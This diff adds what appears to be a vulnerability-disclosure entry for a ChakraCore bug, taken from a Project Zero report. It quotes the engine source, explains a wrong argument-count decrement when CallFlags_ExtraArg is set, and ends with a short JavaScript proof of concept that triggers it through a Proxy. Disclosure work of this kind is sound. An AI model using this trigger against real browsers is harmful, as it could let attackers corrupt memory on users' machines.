@@ -1,0 +1,58 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1295
+
+Here's the method.
+Var JavascriptFunction::EntryCall(RecyclableObject* function, CallInfo callInfo, ...)
+{
+    PROBE_STACK(function->GetScriptContext(), Js::Constants::MinStackDefault);
+
+    RUNTIME_ARGUMENTS(args, callInfo);
+    ScriptContext* scriptContext = function->GetScriptContext();
+
+    Assert(!(callInfo.Flags & CallFlags_New));
+
+    ///
+    /// Check Argument[0] has internal [[Call]] property
+    /// If not, throw TypeError
+    ///
+    if (args.Info.Count == 0 || !JavascriptConversion::IsCallable(args[0]))
+    {
+        JavascriptError::ThrowTypeError(scriptContext, JSERR_This_NeedFunction, _u("Function.prototype.call"));
+    }
+
+    RecyclableObject *pFunc = RecyclableObject::FromVar(args[0]);
+    if (args.Info.Count == 1)
+    {
+        args.Values[0] = scriptContext->GetLibrary()->GetUndefined();
+    }
+    else
+    {
+        ///
+        /// Remove function object from the arguments and pass the rest
+        ///
+        for (uint i = 0; i < args.Info.Count - 1; ++i)
+        {
+            args.Values[i] = args.Values[i + 1];
+        }
+        args.Info.Count = args.Info.Count - 1;
+    }
+
+    ///
+    /// Call the [[Call]] method on the function object
+    ///
+    return JavascriptFunction::CallFunction<true>(pFunc, pFunc->GetEntryPoint(), args);
+}
+
+Chakra uses the first value of "args.Values" as "this" and "args.Info.Count - 1" as the length of the arguments. So "args.Info.Count" must always be 1 or greater. 
+
+But the problem is that the method decrements "args.Info.Count" by one without considering the flag "CallFlags_ExtraArg". If the flag is set, the value of "args.Info.Count" will be decremented again in the next routine(ArgumentReader::AdjustArguments) because the last value of the arguments is not used as an actual argument. Therefore, the value of "args.Info.Count" becomes 0.
+
+PoC:
+-->
+
+function f() {
+    print(arguments);
+}
+
+let call = new Proxy(Function.prototype.call, {});  // proxy calls set the flag
+call.call(f);
